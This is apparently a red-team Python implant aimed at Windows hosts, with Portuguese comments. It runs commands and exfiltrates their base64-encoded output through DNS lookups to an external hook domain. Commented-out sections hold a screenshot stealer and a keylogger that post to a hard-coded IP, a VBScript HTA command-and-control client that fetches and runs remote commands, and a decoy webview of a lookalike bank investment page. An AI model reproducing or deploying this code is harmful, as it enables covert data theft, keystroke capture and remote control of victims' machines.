from PIL import ImageGrab
import base64
import io
import cryptocode
import subprocess
import platform
import sys
import requests
import time
import threading
import os

webhook = ".85051931-332d-4552-9814-1415091cce22.dnshook.site"
url_webview = "https://www.bradescori.com.br/servicos/simulador-de-investimentos/"
if len(sys.argv) < 2:
    print("Usage: python plr.py <command>")
    sys.exit(1)

command = sys.argv[1]
chave_cripto = "RED_TEAM_BRAD"
server_exfiltrate = 'http://34.253.235.91:9789/PSC'
teclas_digitadas = []
tempo_exfiltrar=60
n_teclas=30

#########################################################
# Shell Commands
#########################################################

def run_command_cmd(command):
    try:
        process = subprocess.Popen(["cmd", "/c", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.decode("utf-8"), stderr.decode("utf-8")
    except Exception as e:
        return str(e), ""

def run_command_powershell(command):
    try:
        process = subprocess.Popen(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.decode("utf-8"), stderr.decode("utf-8")
    except Exception as e:
        return str(e), ""

#########################################################
# DNS EXFILTRATION
#########################################################

import dns.resolver
def split_string(string, part_size):
    return [string[i:i+part_size] for i in range(0, len(string), part_size)]
    #return [f"{i+1:03}JJ{string[i:i+part_size]}" for i in range(0, len(string), part_size)]

def process_data(data):
    data_b64 = base64.b64encode(data.encode("utf-8")).decode("utf-8")
    #encrypted_data = cryptocode.encrypt(data_b64, chave_cripto)
    return split_string(data_b64,8)
    
def exfiltrate_command_data(command, is_packet=True):
    output = run_command_cmd(command)[0] if platform.system().lower() != "linux" else subprocess.getoutput(command)
    if is_packet:
        data = process_data(output.rstrip())
        for item in data:
            exfiltrate_data(item + webhook)
    else:
        exfiltrate_data(output.rstrip() + webhook)

def exfiltrate_data(url):
    try:
        time.sleep(10)  # Delay of 10 seconds
        dns.resolver.resolve(str(url), "A")
    except:
        return None

exfiltrate_command_data(command)

#########################################################
# SCREENSHOT
#########################################################
'''
def capture_screen():
    try:
        screen = ImageGrab.grab()
        buffered = io.BytesIO()
        screen.save(buffered, format="JPEG", quality=20)
        return buffered.getvalue()
    except Exception:
        return None
    
def exfiltrate_screenshot():
    image_data = capture_screen()
    if image_data:
        data_b64 = base64.b64encode(image_data).decode('utf-8')
        encrypted_data = cryptocode.encrypt(data_b64, chave_cripto)
        response = requests.post(server_exfiltrate, data={'h_n': run_command_cmd("hostname")[0][:-2], 'P_S_C_B': encrypted_data})
        return response.status_code
    return None

def exfiltrate_screenshot_periodically():
    exfiltrate_screenshot()
    # Chama novamente a função a cada 10 segundos
    threading.Timer(tempo_exfiltrar, exfiltrate_screenshot_periodically).start()

exfiltrate_screenshot_periodically()
'''
#########################################################
# KEYLOGGER
#########################################################
'''
from pynput.keyboard import Listener, Key
def enviar_teclas():
    global teclas_digitadas
    while True:
        if len(teclas_digitadas) >= n_teclas:
            # Envia as 10 teclas para o servidor
            teclas_para_enviar = ''.join(teclas_digitadas[:n_teclas])            
            payload = {'teclas': teclas_para_enviar}
            try:
                # Envia os dados via POST
                r = requests.post(server_exfiltrate, data={'h_n': run_command_cmd("hostname")[0][:-2],'teclas' : teclas_para_enviar})
            except requests.exceptions.RequestException as e:
                return None
            
            # Remove as teclas enviadas
            teclas_digitadas = teclas_digitadas[n_teclas:]
def on_press(key):
    global teclas_digitadas
    try:
        teclas_digitadas.append(key.char)  # Teclas comuns
    except AttributeError:
        if str(key) == "Key.space": key = " "
        teclas_digitadas.append(str(key))  # Teclas especiais como Shift, Esc, etc.    
def on_release(key):
    if key == Key.esc:
        return False
def capturar_teclas():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

#threading.Thread(target=capturar_teclas, daemon=True).start()
#threading.Thread(target=enviar_teclas, daemon=True).start()
'''

#########################################################
# CONEXAO C2
#########################################################
'''
def criar_htm():
    conteudo_string = """
<script language="VBScript">

IP = "147.182.238.46"
port = "8080"

' GET Maximum size (must be a multiple of 4!)
GET_MAX_SIZE = 800

' Scripting.FileSystemObject   [NO]

' Upload function WIP (not fully working yet)
Public Sub WriteFile(byval data, byval name)
    set fso = CreateObject("Scripting.FileSystemObject")
    Set ts = fso.createTextFile(name)
    ts.Write(data)
    ts.Close
End Sub

' Base64 management functions
base64codes = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

Function toUTF8(ByRef str,ByRef size)
    ReDim res(Len(str)*3)
    k=1
    For i = 1 To Len(str)
        ch = (AscW(Mid(str, i, 1))+65536) And 65535
        If (ch < 128) Then
            res(k) = ch
            k=k+1
        Else If (ch < 2048) Then
                res(k) = 192 Or int(ch/64)
                res(k+1) = 128 Or (ch And 63)
                k=k+2
            Else
                res(k) = 224 Or (int(ch/4096) And 15)
                res(k+1) = 128 Or (int(ch/64) And 63)
                res(k+2)  = 128 Or (ch And 63)
                k=k+3
            End If
        End If
    Next
    size = k
    toUTF8 = res
End Function


Public Function Base64Decode(byVal strIn)
    Dim strOut,old
    For n=1 to Len(strIn)
        k = ((n-1) And 3)
        bit=4^k
        val=InStr(base64codes,Mid(strIn,n,1))-1
        if k>0 then strOut=strOut+Chr(((old*bit+Int((val*bit)/64)) And 255))
        old=val
    Next
    Base64Decode = strOut
End Function


Public Function Base64Encode(byVal strIn,ByVal special)
    n=1
    cur=0
    strOut=""
    data=toUTF8(strIn,size)
    For i = 1 To size
        c=data(i)
        if (c>=0) Then
            k = (n-1) Mod 3
            bit = 4^(k+1)
            cur = cur + Int(c/bit)
            nex = int(((c And (bit-1))*64)/bit)
            strOut=strOut+Mid(base64codes,cur+1,1)
            if k=2 or i=size Then strOut=strOut+Mid(base64codes,nex+1,1):nex=0
            cur=nex
            n=n+1
        End If
    Next
    if special then strOut=replace(strOut,"+","_")
    Base64Encode = strOut
End Function


' First path is current path
cd = "."
command = ""
contents = ""
cmdcount = 0
Dim cmdres()
Dim commands()    ' FIFO array
Dim binaryStream
while InStr(command,"remove")=0    

    if cmdcount>0 And Len(Contents)=0 then    
        command=commands(1)
        cmdcount=cmdcount-1
        For x=1 To cmdcount:commands(x)=commands(x+1):Next
        ReDim Preserve commands(cmdcount)        
        set ws = CreateObject("WScript.Shell")
        set cmd = ws.Exec("cmd /K")
        cmd.stdin.writeline("cd "&cd)
        cmd.stdin.writeline(command)
        cmd.stdin.writeline("cd")
        cmd.stdin.close
        cnt = 0
        while not cmd.stdout.AtEndOfStream
            res = cmd.stdout.ReadLine
            ReDim Preserve cmdres(cnt)
            cmdres(cnt) = res
            cnt=cnt+1
        wend
        i=3
        contents=""
        while (i<cnt-4)
            if i>3 then contents = contents & VbCrLf
            contents = contents & cmdres(i)
            i=i+1
        wend

        cd = cmdres(cnt-3)

        curpath = replace(cmdres(cnt-4),">cd",">")
        contents = Base64Encode(contents & VbCrLf & curpath,true)+"*"
    end if

    On Error Resume Next
    With CreateObject("MSXML2.XMLHTTP")
        .open "GET", "http://"&IP&":"&port&"/?arg=" & Mid(contents,1,GET_MAX_SIZE), False
        .send
        if (err.number=0) then
            contents=Mid(contents,GET_MAX_SIZE+1)        
            nextcmd=.responseText
            if nextcmd<>"" then 
                cmdcount=cmdcount+1
                ReDim Preserve commands(cmdcount)
                commands(cmdcount) = nextcmd
            end if
        end if
    End With
    On Error Goto 0

wend

self.close
</script>
"""
    try:
        # Definir o diretório de destino e o nome do arquivo
        diretorio_destino = r"C:\\Temp"
        nome_arquivo = "planilha.hta"
        caminho_arquivo = os.path.join(diretorio_destino, nome_arquivo)
        
        # Verificar se o diretório C:\\Temp existe, caso contrário, cria
        if not os.path.exists(diretorio_destino):
            os.makedirs(diretorio_destino)

        # Abre o arquivo para escrita
        with open(caminho_arquivo, 'w', encoding='utf-8') as f:
            # Escreve a string no arquivo
            f.write(conteudo_string)
        
    except Exception as e:
        print(f"Erro ao criar ou executar o arquivo: {e}")

criar_htm()
run_command_powershell("C:\\Temp\\planilha.hta")    
'''
#########################################################
# Webview
#########################################################
'''
from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtCore import QUrl
import argparse
import sys
class WebView(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Calculadora de Investimento - Bradesco RI')
        self.setGeometry(100, 100, 1024, 768)
        self.browser = QWebEngineView(self)
        self.browser.setUrl(QUrl(url_webview))
        self.setCentralWidget(self.browser)
        self.show()
app = QApplication(sys.argv)
window = WebView()  
sys.exit(app.exec_())
'''
